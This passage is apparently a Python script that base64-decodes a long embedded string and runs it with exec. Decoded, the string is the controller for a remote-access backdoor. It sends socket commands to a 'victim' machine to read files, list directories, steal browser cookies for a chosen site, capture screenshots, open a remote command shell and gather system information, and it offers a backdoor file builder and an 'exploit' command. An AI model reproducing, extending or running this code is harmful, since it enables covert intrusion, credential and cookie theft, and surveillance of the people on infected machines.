2hvdyBmaWxlDQogIHVwbG9hZCAgICAgICAgIHVwbG9hZCBmaWxlDQogIHJlYWQgZmlsZSAgICAgIFJlYWRlciBGaWxlDQogIHB3ZCAgICAgICAgICAgIGdldCBwYXRoDQogIG9wZW4gICAgICAgICAgIG9wZW4gZmlsZSBmcm9tIHZpY3RpbQ0KICBnZXQgY29va2llICAgICBnZXQgY29va2llIHdlYiBzZXJ2ZXINCiIiIikNCiAgICAgICAgICAgICAgICAgICAgaWYgc2hlbGxfY29tbWFuZCA9PSAiaXBjb25maWciOg0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChiJ2lwY29uZmlnJykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXQgPSBjb25uLnJlY3YoOTAyNCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IFBhY2tldCBTdWNjZXNzIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChvdXRwdXQuZGVjb2RlKCkpDQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7cmVkfVstXXtyZXNldH0gRmFpbGVkIEdldCBpcGNvbmZpZyIpDQoNCiAgICAgICAgICAgICAgICAgICAgaWYgc2hlbGxfY29tbWFuZCA9PSAicm91dGUiOg0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChiJ3JvdXRlJykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXQgPSBjb25uLnJlY3YoOTAyNCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IFBhY2tldCBTdWNjZXNzIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChvdXRwdXQuZGVjb2RlKCkpDQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7cmVkfVstXXtyZXNldH0gRmFpbGVkIEdldCBSb3V0ZSIpDQoNCiAgICAgICAgICAgICAgICAgICAgaWYgc2hlbGxfY29tbWFuZCA9PSAicmVhZCBmaWxlIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25uLnNlbmQoYiJyZWFkIGZpbGUiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGggPSBpbnB1dCgiRW50ZXIgVmljdGltIFBhdGggRmlsZSA6ICIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29ubi5zZW5kKHBhdGguZW5jb2RlKCkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0ID0gY29ubi5yZWN2KDkwMDI0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gRmlsZSA6ICIsIHBhdGgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQob3V0cHV0LmRlY29kZSgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie3JlZH1bLV17cmVzZXR9IFJlYWQgUGF0aCBGYWlsZWQiKQ0KDQogICAgICAgICAgICAgICAgICAgIGlmIHNoZWxsX2NvbW1hbmQgPT0gImV4aXQiOg0KICAgICAgICAgICAgICAgICAgICAgICAgY29ubi5zZW5kKGInZXhpdCcpDQogICAgICAgICAgICAgICAgICAgICAgICBjb25uLnNlbmQoZmlsZV9uYW1lLmVuY29kZSgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBTZXNzaW9ucyBDbG9zZWQiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsNCg0KICAgICAgICAgICAgICAgICAgICBpZiBzaGVsbF9jb21tYW5kID09ICJwd2QiOg0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChiInB3ZCIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0ID0gY29ubi5yZWN2KDEwMDI0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gUGFja2V0IFN1Y2Nlc3MiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gUEFUSCA6IHtvdXRwdXQuZGVjb2RlKCl9IikNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntyZWR9Wy1de3Jlc2V0fSBHZXQgUGF0aCBGYWlsZWQiKQ0KDQogICAgICAgICAgICAgICAgICAgIGlmIHNoZWxsX2NvbW1hbmQgPT0gImdldCBjb29raWUiOg0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGltcG9ydCBqc29uDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29ubi5zZW5kKGIiZ2V0IGNvb2tpZSIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2ViID0gaW5wdXQoIkVudGVyIHdlYnNpdGUgZm9yIGdldCA6ICIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBQYWNrZXQgU3VjY2VzcyIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29ubi5zZW5kKHdlYi5lbmNvZGUoKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaXN0X2Nvb2sgPSBjb25uLnJlY3YoOTAyNCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb29raWUgPSBqc29uLmxvYWRzKGxpc3RfY29vay5kZWNvZGUoKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKyIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJcbntjb29raWV9XG4iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCIrLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rIikNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntyZWR9Wy1de3Jlc2V0fSBGYWlsZWQgR2V0IENvb2tpZSIpDQoNCiAgICAgICAgICAgICAgICAgICAgaWYgc2hlbGxfY29tbWFuZCA9PSAib3BlbiI6DQogICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29ubi5zZW5kKGIib3BlbiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZSA9IGlucHV0KCJFbnRlciBZb3VyIFBhdGggRmlsZSBPcGVuICggZXggOiBDOlxXaW5kb3dzXGhhY2tlZC52YnMgKSA+PiAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChmaWxlLmVuY29kZSgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gU2VuZGluZyBTdWNjZXNzIikNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntyZWR9Wy1de3Jlc2V0fSBPcGVuIEZhaWxlZCIpDQoNCiAgICAgICAgICAgICAgICAgICAgaWYgc2hlbGxfY29tbWFuZCA9PSAidXBsb2FkIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRoX2ZpbGUgPSBpbnB1dCgiRW50ZXIgWW91ciBQYXRoIEZpbGUgPiAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihmIntwYXRoX2ZpbGV9IiwgJ3JiJykgYXMgcmVhZGVyX2RvYzoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jcyA9IHJlYWRlcl9kb2MucmVhZCgxMDAwMjQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gU3RhcnQgVXBsb2FkLi4uIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBTZW5kaW5nIFRvIFRhcmdldCBTdWNjZXNzIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBmaWxlIDogdXBsb2FkXzEyMy5odG1sIikNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntyZWR9Wy1de3Jlc2V0fSBGYWlsZWQgVXBsb2FkIikNCg0KICAgICAgICAgICAgICAgICAgICBpZiBzaGVsbF9jb21tYW5kID09ICJkaXIiOg0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChiImRpciIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY21kID0gaW5wdXQoIkVudGVyIFBhdGggVmljdGltcyAoIERlZmF1bHQgOiBDOlxXaW5kb3dzXFN5c3RlbTMyICkgPj4+ICIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29ubi5zZW5kKGNtZC5lbmNvZGUoKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXQgPSBjb25uLnJlY3YoOTAwMDI0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gU2VuZGluZyBTdWNjZXNzIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIlxue291dHB1dC5kZWNvZGUoJ2xhdGluLTEnKX1cbiIpDQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7cmVkfVstXXtyZXNldH0gRmFpbGVkIFNob3cgRmlsZSIpDQoNCiAgICAgICAgICAgICAgICAgICAgaWYgc2hlbGxfY29tbWFuZCA9PSAic2NyZWVuc2hvdCI6DQogICAgICAgICAgICAgICAgICAgICAgICBpbXBvcnQgcmFuZG9tDQogICAgICAgICAgICAgICAgICAgICAgICBuID0gcmFuZG9tLnJhbmRpbnQoMTAwMDAwLCA5OTk5OTkpDQogICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29ubi5zZW5kKGIic2NyZWVuc2hvdCIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKGYnZWNobyAiIiA+IHthZGRyWzBdfV97bn0ucG5nJykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4oZid7YWRkclswXX1fe259LnBuZycsICd3YicpIGFzIHNhdmU6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gQ1RSTCArIEMgRXhpdCBTY3JlZW5zaG90IikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBTdGFydGluZyBGZXRjaGluZyBJbWFnZS4uLiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbWFnZV9kYXRhID0gY29ubi5yZWN2KDkwMjQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgaW1hZ2VfZGF0YToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2F2ZS53cml0ZShpbWFnZV9kYXRhKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gU2VuZGluZyBwYWNrZXQgVG8gVmljdGltIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IFNjcmVlbnNob3QgU3VjY2VzcyIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBJbWFnZSBTYXZlZCBUbyA6IHthZGRyWzBdfV97bn0ucG5nIikNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9IFNlbmRpbmcgcGFja2V0IFRvIFZpY3RpbSIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBTY3JlZW5zaG90IFN1Y2Nlc3MiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie2dyZWVufVsrXXtyZXNldH0gSW1hZ2UgU2F2ZWQgVG8gOiB7YWRkclswXX1fe259LnBuZyIpDQoNCiAgICAgICAgICAgICAgICAgICAgaWYgc2hlbGxfY29tbWFuZCA9PSAic2hlbGwiOg0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJTdGFydGluZyBDb21tYW5kIFByb21wdCwgQ01EIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSBUcnVlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaGVsbCA9IGlucHV0KCJzaGVsbCA+ICIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNoZWxsID09ICJleGl0IjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChiImV4aXQiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29ubi5zZW5kKHNoZWxsLmVuY29kZSgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXQgPSBjb25uLnJlY3YoMjAyNCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJcbntvdXRwdXQuZGVjb2RlKCl9IikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KDQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7cmVkfVstXXtyZXNldH0gU2hlbGwgRXJyb3IiKQ0KDQogICAgICAgICAgICAgICAgICAgIGlmIHNoZWxsX2NvbW1hbmQgPT0gIm1lc3NlbmdlIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25uLnNlbmQoYiJtZXNzZW5nZSIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzcyA9IGlucHV0KCJFbnRlciBNZXNzZWVnZSA6ICIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29ubi5zZW5kKG1lc3MuZW5jb2RlKCkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSBTdGFydCBTZW5kaW5nIE1lc3NlbmdlICA6IHttZXNzfSIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSAgRGVmYXVsdCBPcGVuIFRhYiA6IDEwIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntncmVlbn1bK117cmVzZXR9ICBTZW5kaW5nIE1lc3NlbmdlciBTdWNjZXNzIikNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntyZWR9Wy1de3Jlc2V0fSBTaG93IE1lc3NlbmdlIEZhaWxlZCIpDQoNCiAgICAgICAgICAgICAgICAgICAgaWYgc2hlbGxfY29tbWFuZCA9PSAic3lzaW5mbyI6DQogICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29ubi5zZW5kKGIic3lzaW5mbyIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3lzcyA9IGNvbm4ucmVjdig5MDI0KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQgPSBzeXNzLmRlY29kZSgnbGF0aW4tMScpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJ7Z3JlZW59Wytde3Jlc2V0fSAgU2VuZGluZyBTdWNjZXNzIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1bmFtZXMgPSBkLnJlcGxhY2UoJ3VuYW1lX3Jlc3VsdCcsICcnKS5yZXBsYWNlKCIoIiwgIiIpLnJlcGxhY2UoIikiLCAiIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1bmFtZSA9IHVuYW1lcy5yZXBsYWNlKCInIiwgIiIpLnJlcGxhY2UoIiwiLCAiXG4iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGEgPSB1bmFtZS5yZXBsYWNlKCc9JywgJyA6ICcpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYiXG57YX1cbiIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie3JlZH1bLV17cmVzZXR9IENsaWVudCBOb3QgQWNjZXB0LCBGYWlsZWQgR2V0IFN5c0luZm8iKQ0KDQogICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7cmVkfVstXXtyZXNldH0gQ29ubmVjdCBGcm9tIENsaWVudCBJcyBEb3duIikNCg0KICAgIGlmIGMyX2lucHV0ID09ICJoZWxwIiBvciBjMl9pbnB1dCA9PSAiaGVscCAiOg0KICAgICAgICBwcmludCgiIiINCg0KQ29tbWFuZCAgICAgICAgIERlc2NyaXB0aW9uDQotLS0tLS0tLSAgICAgICAtLS0tLS0tLS0tLS0tDQogICBidWlsZCAgICAgICAgIEJ1aWxkIEZvcm1hdCBGaWxlIEJhY2tkb29yDQogICBnZW5lcmF0b3IgICAgIGJ1aWxkIHNob3J0Y3V0IEZvcm1hdCBGaWxlIEJhY2tkb29yDQogICBsaG9zdCAgICAgICAgIHNldCBsb2NhbCBob3N0IHNlcnZlcg0KICAgbHBvcnQgICAgICAgICBzZXQgbG9jYWwgcG9ydCBzZXJ2ZXINCiAgIHJob3N0ICAgICAgICAgc2V0IHJlbW90ZSBob3N0IGNsaWVudA0KICAgcnBvcnQgICAgICAgICBzZXQgcmVtb3RlIHBvcnQgY2xpZW50DQogICBvcHRpb24gICAgICAgIHNob3cgb3B0aW9ucyBzZXR0aW5ncw0KDQpleHBsb2l0DQotLS0tLS0tDQogICBleHBsb2l0ICAgICAgIHN0YXJ0IGV4cGxvaXQNCiAgIHJ1biAgICAgICAgICAgZXhwbG9pdCBzaG9ydGN1dA0KDQpTZXJ2ZXINCi0tLS0tLQ0KICAgc2hvdyBpbmV0ICAgICBTaG93IEluZXQNCg0KIiIiKQ0KICAgIGlmIGMyX2lucHV0ID09ICJvcHRpb24iIG9yIGMyX2lucHV0ID09ICJvcHRpb24gIiBvciBjMl9pbnB1dCA9PSAib3B0aW9ucyI6DQogICAgICAgIHByaW50KGYiIiINClNlcnZlciAgICAgICAgICAgIERlc2NyaXB0aW9uICAgICAgICAgICBTZXR0aW5nIFVwDQotLS0tLS0gICAgICAgICAgICAtLS0tLS0tLS0tLS0gICAgICAgICAgLS0tLS0tLS0tLS0NCiBMSE9TVCAgICAgICAgICAgICBMb2NhbCBTZXJ2ZXIgSG9zdCAgICAge2xob3N0fQ0KIExQT1JUICAgICAgICAgICAgIExvY2FsIFNlcnZlciBQb3J0ICAgICB7bHBvcnR9DQoNCkNsaWVudCAgICAgICAgICAgIERlc2NyaXB0aW9uICAgICAgICAgICBTZXR0aW5nIFVwDQotLS0tLS0gICAgICAgICAgICAtLS0tLS0tLS0tLS0gICAgICAgICAgLS0tLS0tLS0tLS0NCiBSSE9TVCAgICAgICAgICAgICBSZW1vdGUgQ2xpZW50IEhvc3QgICAge3Job3N0fQ0KIFJQT1JUICAgICAgICAgICAgIFJlbW90ZSBDbGllbnQgUG9ydCAgICB7cnBvcnR9DQoNCkZvcm1hdCAgICAgICAgICAgIERlc2NyaXB0aW9uICAgICAgICAgICBTZXR0aW5nIFVwDQotLS0tLS0gICAgICAgICAgICAtLS0tLS0tLS0tLS0gICAgICAgICAgLS0tLS0tLS0tLS0NCiBGSUxFX05BTUUgICAgICAgICBGb3JtYXQgRmlsZSBOYW1lICAgICAge2ZpbGVfbmFtZX0ucHkNCiIiIikNCiAgICBpZiBjMl9pbnB1dCA9PSAic2hvdyBpbmV0IjoNCiAgICAgICAgb3Muc3lzdGVtKCdpcGNvbmZpZycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2lmY29uZmlnIHwgZ3JlcCAiaW5ldCInKQ0KICAgIGlmIGMyX2lucHV0ID09ICJleGl0IjoNCiAgICAgICAgcHJpbnQoZiJ7cmVkfVstXXtyZXNldH0gVGhhbmtzIEZvciBVc2luZyBUb29sIikNCiAgICAgICAgZXhpdChmIntyZWR9Wy1de3Jlc2V0fSBFeGl0IEJ5IFVzZXIiKQ0KICAgIGVsc2U6DQogICAgICAgIHBhc3M="
start = base64.b64decode(script)
exec(start)
